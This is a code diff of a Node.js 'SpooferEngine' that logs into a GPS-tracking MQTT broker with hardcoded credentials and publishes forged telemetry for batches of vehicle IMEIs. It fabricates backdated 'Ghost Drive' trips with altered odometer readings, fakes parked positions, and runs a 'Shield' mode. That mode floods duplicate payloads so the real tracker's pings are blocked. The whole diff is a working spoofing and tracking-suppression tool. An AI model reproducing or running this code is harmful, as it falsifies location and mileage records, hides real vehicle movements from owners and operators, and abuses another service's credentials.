@@ -3,28 +3,16 @@ const axios = require('axios');
 
 class SpooferEngine {
     constructor() {
-        this.clients = [];
-        this.is_running = false;
-        
-        this.imeis = [];
-        this.start_lat = 0.0;
-        this.start_lng = 0.0;
-        this.mode = "parked";
-        this.history_date = "";
-        this.target_hours = 0;
-        this.speed = 0;
-        this.start_odo = 0;
-        this.start_today_odo = 0;
-        this.shield_hours = 0;
-        
-        this.active_shields = 0;
-        this.intervals = [];
-        
+        this.active_shields_list = {}; // { imei: { expiry_time, cancel, interval, client } }
+        this.active_drives = 0;
         this.logs = [];
         this.MQTT_BROKER = "mqtt://igps.io:1883";
         this.is_scheduled = false;
-        
-        this.active_shields_list = {}; // { imei: { expiry_time, cancel, interval } }
+        this.kill_all_drives = false;
+    }
+    
+    get is_running() {
+        return this.active_drives > 0 || Object.keys(this.active_shields_list).length > 0;
     }
     
     log(message) {
@@ -105,57 +93,39 @@ class SpooferEngine {
     }
     
     start(imeis, lat, lng, mode, history_date, target_hours, start_odo, speed, start_today_odo = 0.0, shield_hours = 0.0) {
-        if (this.is_running) return false;
+        const config = {
+            lat: parseFloat(lat),
+            lng: parseFloat(lng),
+            mode: mode,
+            history_date: history_date,
+            target_hours: parseFloat(target_hours),
+            start_odo: parseFloat(start_odo),
+            start_today_odo: parseFloat(start_today_odo),
+            speed: parseFloat(speed),
+            shield_hours: parseFloat(shield_hours)
+        };
         
-        this.imeis = imeis;
-        this.start_lat = parseFloat(lat);
-        this.start_lng = parseFloat(lng);
-        this.mode = mode;
-        this.history_date = history_date;
-        this.target_hours = parseFloat(target_hours);
-        this.start_odo = parseFloat(start_odo);
-        this.start_today_odo = parseFloat(start_today_odo);
-        this.speed = parseFloat(speed);
-        this.shield_hours = parseFloat(shield_hours);
-        this.active_shields = 0;
+        if (config.mode === "parked") config.speed = 0;
         
-        if (this.mode === "parked") this.speed = 0;
+        this.log(`[+] Concurrent Spoofer started for ${imeis.length} vehicles in ${config.mode.toUpperCase()} mode.`);
         
-        this.logs = [];
-        this.is_running = true;
-        this.clients = [];
-        this.intervals = [];
-        // Note: we do not clear active_shields_list on start, because some might be running from previous starts!
-        
-        
-        this.log(`Starting Engine for ${this.imeis.length} vehicles in ${this.mode.toUpperCase()} mode.`);
-        
-        // Start processing asynchronously
-        this._orchestrator();
+        // Run asynchronously without blocking
+        this._orchestrator(imeis, config);
         
         return true;
     }
     
     stop() {
-        if (!this.is_running) return false;
-        
-        this.is_running = false;
-        this.intervals.forEach(clearInterval);
-        this.intervals = [];
-        
-        this.clients.forEach(client => {
-            try { client.end(); } catch(e) {}
-        });
-        this.clients = [];
+        this.kill_all_drives = true;
         
         // Clear all shields explicitly
         Object.keys(this.active_shields_list).forEach(imei => {
             try { this.active_shields_list[imei].cancel(); } catch(e) {}
         });
         this.active_shields_list = {};
-        this.active_shields = 0;
         
-        this.log("[-] Spoofer stopped. All vehicles reverted to hardware tracking.");
+        this.log("[-] STOP ALL ISSUED: All Ghost Drives and Shields killed.");
+        setTimeout(() => { this.kill_all_drives = false; }, 3000);
         return true;
     }
     
@@ -168,54 +138,73 @@ class SpooferEngine {
         return { lat: lat2 * 180 / Math.PI, lng: lon2 * 180 / Math.PI };
     }
     
-    async _orchestrator() {
+    async _orchestrator(imeis, config) {
+        this.active_drives++;
         const batch_size = 100;
-        for (let i = 0; i < this.imeis.length; i += batch_size) {
-            if (!this.is_running) break;
-            const batch = this.imeis.slice(i, i + batch_size);
+        for (let i = 0; i < imeis.length; i += batch_size) {
+            if (this.kill_all_drives) break;
+            const batch = imeis.slice(i, i + batch_size);
             
-            const promises = batch.map(imei => this._process_vehicle(imei));
+            const promises = batch.map(imei => this._process_vehicle(imei, config));
             await Promise.all(promises);
             
             await new Promise(r => setTimeout(r, 1000));
         }
-        
-        if (this.is_running && ["drive", "drive_km"].includes(this.mode) && this.history_date) {
-            this.log("[+] All Historical Ghost Trips completed successfully.");
-            this.is_running = false;
-        } else if (this.is_running && this.active_shields === 0 && this.mode !== "parked") {
-            this.log("[+] Live Injection completed. No active shields.");
-            this.is_running = false;
-        }
+        this.active_drives = Math.max(0, this.active_drives - 1);
+        this.log(`[+] Batch completed.`);
     }
     
     formatDateStr(dateObj) {
         return dateObj.toISOString().replace('T', ' ').substring(0, 19);
     }
     
-    async _process_vehicle(imei) {
+    async _process_vehicle(imei, config) {
         return new Promise(async (resolve) => {
+            // Pre-register shield if applicable to show in UI immediately
+            let is_cancelled = false;
+            let shield_interval_id = null;
+            let current_client = null;
+            
+            if (config.mode === "drive_km" && config.shield_hours > 0 && !config.history_date) {
+                const expiryDate = new Date(Date.now() + config.shield_hours * 3600000);
+                const expiryStr = this.formatDateStr(expiryDate);
+                
+                this.active_shields_list[imei] = {
+                    expiry_time: expiryStr,
+                    cancel: () => {
+                        is_cancelled = true;
+                        if (shield_interval_id) clearInterval(shield_interval_id);
+                        if (current_client) {
+                            try { current_client.end(); } catch(e) {}
+                        }
+                        delete this.active_shields_list[imei];
+                        this.log(`[${imei}] Shield manually cancelled.`);
+                    }
+                };
+            }
+
             const client = mqtt.connect(this.MQTT_BROKER, {
                 username: "realiot",
                 password: "realmqtt@123",
                 clientId: `mqttjs_${Math.random().toString(16).substr(2, 8)}`
             });
             
-            this.clients.push(client);
+            current_client = client;
             
             client.on('error', (err) => {
                 this.log(`Error connecting ${imei}: ${err}`);
+                if (this.active_shields_list[imei]) delete this.active_shields_list[imei];
                 resolve();
             });
             
             client.on('connect', async () => {
                 const topic = `BB/${imei}`;
                 
-                if (this.mode === "drive") {
+                if (config.mode === "drive") {
                     let start_date;
-                    if (this.history_date) {
+                    if (config.history_date) {
                         try {
-                            const d = new Date(this.history_date);
+                            const d = new Date(config.history_date);
                             d.setUTCHours(18, 29, 50, 0); // 18:29:50 UTC
                             start_date = d;
                         } catch(e) { start_date = new Date(); }
@@ -226,31 +215,28 @@ class SpooferEngine {
                         start_date = new Date();
                     }
                     
-                    start_date = new Date(start_date.getTime() - (this.target_hours * 3600000));
-                    const broadcasts_per_day = Math.floor((this.target_hours * 3600) / 5);
-                    start_date = new Date(start_date.getTime() - (this.target_hours * 3600000));
+                    start_date = new Date(start_date.getTime() - (config.target_hours * 3600000));
+                    const broadcasts_per_day = Math.floor((config.target_hours * 3600) / 5);
+                    start_date = new Date(start_date.getTime() - (config.target_hours * 3600000));
                     
-                    const speed_ms = this.speed * (1000.0 / 3600.0);
+                    const speed_ms = config.speed * (1000.0 / 3600.0);
                     const distance_m_per_tick = speed_ms * 5.0;
                     
-                    this.log(`[${imei}] Injecting ${this.target_hours} hrs ending at: ${this.formatDateStr(start_date)}...`);
+                    this.log(`[${imei}] Injecting ${config.target_hours} hrs ending at: ${this.formatDateStr(start_date)}...`);
                     
-                    let total_odo = this.start_odo || 0.0;
-                    let today_odo = this.start_today_odo || 0.0;
+                    let total_odo = config.start_odo || 0.0;
+                    let today_odo = config.start_today_odo || 0.0;
                     
-                    // Auto-fetch if 0
                     if (total_odo === 0.0) {
-                        this.log(`[${imei}] Auto-fetching real ODO to prevent negative KM drop...`);
-                        const fetch_result = await this.fetch_live_data_instant(imei, this.history_date);
+                        const fetch_result = await this.fetch_live_data_instant(imei, config.history_date);
                         if (fetch_result.success) {
                             total_odo = fetch_result.odo || 0.0;
                             today_odo = fetch_result.today_odo || 0.0;
-                            this.log(`[${imei}] Safely fetched ODO: ${total_odo}`);
                         }
                     }
                     
                     for (let i = 0; i < broadcasts_per_day; i++) {
-                        if (!this.is_running) break;
+                        if (this.kill_all_drives) break;
                         
                         const current_time = new Date(start_date.getTime() + (i * 5000));
                         const time_str = this.formatDateStr(current_time);
@@ -260,22 +246,20 @@ class SpooferEngine {
                         today_odo += dist_km;
                         const odo_str = `${total_odo.toFixed(6)}-${today_odo.toFixed(6)}`;
                         
-                        const payload = `##,${imei},0,${time_str},,,${this.speed},45.0,0,1,91.26,${odo_str},0-0,0-0,0-0,+0.0,0,1-1-1-1,2000-00-00 00:00:00,2000-00-00 00:00:00,28,3950,0,0-1-0-1-1,0,0,0-0,0,0,2782,1,0-26,3950,1,0,0,0,00000-00,$`;
+                        const payload = `##,${imei},0,${time_str},,,${config.speed},45.0,0,1,91.26,${odo_str},0-0,0-0,0-0,+0.0,0,1-1-1-1,2000-00-00 00:00:00,2000-00-00 00:00:00,28,3950,0,0-1-0-1-1,0,0,0-0,0,0,2782,1,0-26,3950,1,0,0,0,00000-00,$`;
                         client.publish(topic, payload);
                         await new Promise(r => setTimeout(r, 5)); // 5ms sleep
                     }
                     
-                    this.log(`[${imei}] Finished Drive Mode injection.`);
-                    if (this.history_date) {
-                        client.end();
-                    }
+                    this.log(`[${imei}] Finished Ghost Drive.`);
+                    client.end();
                     resolve();
                     
-                } else if (this.mode === "drive_km") {
+                } else if (config.mode === "drive_km") {
                     let start_date;
-                    if (this.history_date) {
+                    if (config.history_date) {
                         try {
-                            const d = new Date(this.history_date);
+                            const d = new Date(config.history_date);
                             d.setUTCHours(18, 29, 50, 0); // 18:29:50 UTC
                             start_date = d;
                         } catch(e) { start_date = new Date(); }
@@ -286,35 +270,33 @@ class SpooferEngine {
                         start_date = new Date();
                     }
                     
-                    start_date = new Date(start_date.getTime() - (this.target_hours * 3600000));
-                    const broadcasts_per_day = Math.floor((this.target_hours * 3600) / 5);
+                    start_date = new Date(start_date.getTime() - (config.target_hours * 3600000));
+                    const broadcasts_per_day = Math.floor((config.target_hours * 3600) / 5);
                     
-                    const speed_ms = this.speed * (1000.0 / 3600.0);
+                    const speed_ms = config.speed * (1000.0 / 3600.0);
                     const distance_m_per_tick = speed_ms * 5.0;
                     
-                    this.log(`[${imei}] Injecting ${this.target_hours} hrs [Ghost Drive (KM)]...`);
+                    this.log(`[${imei}] Injecting ${config.target_hours} hrs [Ghost Drive (KM)]...`);
                     
-                    let curr_lat = this.start_lat;
-                    let curr_lng = this.start_lng;
+                    let curr_lat = config.lat;
+                    let curr_lng = config.lng;
                     let toggle_position = false;
                     
-                    let total_odo = this.start_odo || 0.0;
-                    let today_odo = this.start_today_odo || 0.0;
+                    let total_odo = config.start_odo || 0.0;
+                    let today_odo = config.start_today_odo || 0.0;
                     
                     if (total_odo === 0.0) {
-                        this.log(`[${imei}] Auto-fetching real ODO from server...`);
-                        const fetch_result = await this.fetch_live_data_instant(imei, this.history_date);
+                        const fetch_result = await this.fetch_live_data_instant(imei, config.history_date);
                         if (fetch_result.success) {
                             total_odo = fetch_result.odo || 0.0;
                             today_odo = fetch_result.today_odo || 0.0;
-                            this.log(`[${imei}] Fetched ODO: ${total_odo}`);
                         }
                     }
                     
                     let last_payload = "";
                     
                     for (let i = 0; i < broadcasts_per_day; i++) {
-                        if (!this.is_running) break;
+                        if (this.kill_all_drives) break;
                         
                         const current_time = new Date(start_date.getTime() + (i * 5000));
                         const time_str = this.formatDateStr(current_time);
@@ -324,102 +306,74 @@ class SpooferEngine {
                         today_odo += dist_km;
                         
                         if (toggle_position) {
-                            const next_pos = this._calculate_next_position(this.start_lat, this.start_lng, distance_m_per_tick, 0);
+                            const next_pos = this._calculate_next_position(config.lat, config.lng, distance_m_per_tick, 0);
                             curr_lat = next_pos.lat;
                             curr_lng = next_pos.lng;
                         } else {
-                            curr_lat = this.start_lat;
-                            curr_lng = this.start_lng;
+                            curr_lat = config.lat;
+                            curr_lng = config.lng;
                         }
                         toggle_position = !toggle_position;
                         
                         const coord_str = `+${curr_lat.toFixed(6)},+${curr_lng.toFixed(6)}`;
                         const odo_str = `${total_odo.toFixed(6)}-${today_odo.toFixed(6)}`;
                         
-                        last_payload = `##,${imei},0,${time_str},${coord_str},${this.speed},45.0,0,1,91.26,${odo_str},0-0,0-0,0-0,+0.0,0,1-1-1-1,2000-00-00 00:00:00,2000-00-00 00:00:00,28,3950,0,1-1-0-1-1,0,0,0-0,0,0,2782,1,0-26,3950,1,0,0,0,00000-00,$`;
+                        last_payload = `##,${imei},0,${time_str},${coord_str},${config.speed},45.0,0,1,91.26,${odo_str},0-0,0-0,0-0,+0.0,0,1-1-1-1,2000-00-00 00:00:00,2000-00-00 00:00:00,28,3950,0,1-1-0-1-1,0,0,0-0,0,0,2782,1,0-26,3950,1,0,0,0,00000-00,$`;
                         client.publish(topic, last_payload);
                         await new Promise(r => setTimeout(r, 5));
                     }
                     
-                    this.log(`[${imei}] Finished Drive Mode injection.`);
+                    this.log(`[${imei}] Finished Ghost Drive.`);
                     
                     // SHIELD MODE for Node.js
-                    if (this.shield_hours > 0 && !this.history_date) {
-                        this.active_shields++;
-                        this.log(`[${imei}] Active SHIELD MODE engaged for ${this.shield_hours} hours. Crushing hardware pings...`);
+                    if (config.shield_hours > 0 && !config.history_date) {
+                        this.log(`[${imei}] Ghost Drive finished. Shield engaged.`);
                         
-                        const expiryDate = new Date(Date.now() + this.shield_hours * 3600000);
-                        const expiryStr = this.formatDateStr(expiryDate);
-                        
-                        const shield_loops = Math.floor((this.shield_hours * 3600) / 3);
+                        const shield_loops = Math.floor((config.shield_hours * 3600) / 3);
                         let loops_done = 0;
                         
-                        let is_cancelled = false;
-                        
-                        this.active_shields_list[imei] = {
-                            expiry_time: expiryStr,
-                            cancel: () => {
-                                is_cancelled = true;
-                                if (this.active_shields_list[imei] && this.active_shields_list[imei].interval) {
-                                    clearInterval(this.active_shields_list[imei].interval);
-                                }
-                                try { client.end(); } catch(e) {}
-                                delete this.active_shields_list[imei];
-                                this.active_shields = Math.max(0, this.active_shields - 1);
-                                this.log(`[${imei}] Shield manually cancelled.`);
-                                if (this.active_shields === 0 && this.is_running) {
-                                    this.log("[+] All Shields cancelled. Spoofer resting.");
-                                    this.is_running = false;
-                                }
-                            }
-                        };
-                        
                         // We use setInterval for the shield so it runs asynchronously
-                        const shield_interval = setInterval(() => {
-                            if (is_cancelled) return;
+                        shield_interval_id = setInterval(() => {
+                            if (is_cancelled || this.kill_all_drives) return;
                             
-                            if (!this.is_running || loops_done >= shield_loops) {
-                                clearInterval(shield_interval);
-                                if (!is_cancelled) this.log(`[${imei}] Shield Time expired. Releasing connection.`);
+                            if (loops_done >= shield_loops) {
+                                clearInterval(shield_interval_id);
+                                this.log(`[${imei}] Shield Time expired. Releasing connection.`);
                                 client.end();
                                 delete this.active_shields_list[imei];
-                                this.active_shields = Math.max(0, this.active_shields - 1);
-                                
-                                if (this.active_shields === 0 && this.is_running) {
-                                    this.log("[+] All Shields expired. Spoofer resting.");
-                                    this.is_running = false;
-                                }
                                 return;
                             }
                             
-                            // Use the EXACT same payload from the end of the trip
-                            // so the server ignores the duplicate location/time
-                            // but the ping still blocks the hardware connection!
+                            // Re-use exact last payload to prevent continuous running status
                             if (last_payload) {
                                 client.publish(topic, last_payload);
                             }
                             loops_done++;
                         }, 3000); // 3 seconds
-                        this.active_shields_list[imei].interval = shield_interval;
-                        this.intervals.push(shield_interval);
                         
-                    } else if (this.history_date) {
+                        // Map the interval so it can be canceled
+                        if (this.active_shields_list[imei]) {
+                            this.active_shields_list[imei].interval = shield_interval_id;
+                        }
+                        
+                    } else {
                         client.end();
+                        if (this.active_shields_list[imei]) delete this.active_shields_list[imei];
                     }
                     
                     resolve();
                 } else {
                     // Parked mode
                     const park_interval = setInterval(() => {
-                        if (!this.is_running) {
+                        if (this.kill_all_drives) {
                             clearInterval(park_interval);
+                            client.end();
                             return;
                         }
                         const current_time = this.formatDateStr(new Date());
-                        const payload = `##,${imei},0,${current_time},+${this.start_lat.toFixed(6)},+${this.start_lng.toFixed(6)},0,0.0,0,1,100.0,0-0,0-0,0-0,0-0,+0.0,0,0-0-0-0,2000-00-00 00:00:00,2000-00-00 00:00:00,25,4000,0,1-0-0-0-0,0,0,0-0,0,0,0,1,0-0,4000,1,0,0,0,00000-00,$`;
+                        const payload = `##,${imei},0,${current_time},+${config.lat.toFixed(6)},+${config.lng.toFixed(6)},0,0.0,0,1,100.0,0-0,0-0,0-0,0-0,+0.0,0,0-0-0-0,2000-00-00 00:00:00,2000-00-00 00:00:00,25,4000,0,1-0-0-0-0,0,0,0-0,0,0,0,1,0-0,4000,1,0,0,0,00000-00,$`;
                         client.publish(topic, payload);
                     }, 5000);
-                    this.intervals.push(park_interval);
                     resolve();
                 }
             });
